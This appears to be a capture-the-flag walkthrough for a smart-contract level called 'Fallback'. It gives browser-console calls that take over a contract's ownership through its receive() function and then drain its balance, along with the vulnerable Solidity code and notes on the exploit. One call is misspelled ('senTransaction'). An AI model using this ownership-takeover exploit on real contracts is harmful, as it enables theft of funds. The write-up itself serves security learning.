# Level 1 - Fallback challenge
## Player will use browser console for this attack.
```JavaScript
await contract.contribute({value: 1});
await contract.senTransaction({value: 1 });
await contract.owner();
await contract.withdraw();
```
```Solidity
 /** 
 @notice This fallback function receive() is the main attack target, in order to pass the 
  require statement player must use function contribute() 1 wei will be enough, using the console
  player calls await contract.contribute({value: 1}), then player calls await contract.sendTransaction({value: 1}),
  player can verify ownership with await contract.owner(), player will now be able to withdraw all tokens 
  */
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; 
  }
  
  /** 
  @notice This function could use a withdraw limit, but this allows player to exploit the 
  vulnerability to withdraw all funds using await contract.withdraw() to complete this level. 
  */
  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
  ```
  
